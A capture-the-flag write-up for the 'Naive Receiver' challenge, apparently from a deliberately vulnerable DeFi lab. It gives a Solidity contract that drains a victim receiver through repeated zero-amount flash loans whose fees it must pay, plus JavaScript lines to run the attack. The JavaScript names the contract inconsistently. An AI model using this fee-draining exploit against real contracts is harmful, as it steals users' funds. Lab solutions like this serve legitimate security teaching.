# Naive Receiver

**HINT:** Does the ```NaiveReceiverLenderPool.sol``` contract authenticate the user?

<details>
<summary>Part 1</summary>
<p>

Anyone can use their contract to take out flash loans on the Lender Pool's dime, so we use it to drain them like so:
```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";


interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract naiveReceiverAttack {
    function attack(INaiveReceiverLenderPool pool, address payable receiver) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Now go to ```naive-receiver.challenge.js``` and at the top of the file add:
```js
const naiveReceiverAttack = contract.fromArtifact('naiveReceiverAttack');
```
And at ```Exploit``` add:
```js
this.attacker = await naiveReceiverAttacker.new({ from: attacker });
await this.attacker.attack(this.pool.address, this.receiver.address)
```

```sh
npm run naive-receiver.challenge.js
```

</p>
</details>
